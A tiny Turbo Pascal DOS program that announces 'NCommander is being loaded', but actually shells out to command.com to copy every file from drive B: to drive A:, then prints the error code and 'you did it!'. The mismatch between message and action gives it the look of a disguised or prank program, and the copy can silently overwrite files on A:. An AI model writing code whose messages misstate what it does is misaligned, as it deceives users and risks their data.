PRogram StartNC;
uses dos,crt;
begin
 {$M 8000,0,8000}
write('NCommander is being loaded !!');
exec('c:\command.com','/C copy b:*.* a:');
write('DosError meldet:',DosError,'......');
write('you did it!');
end.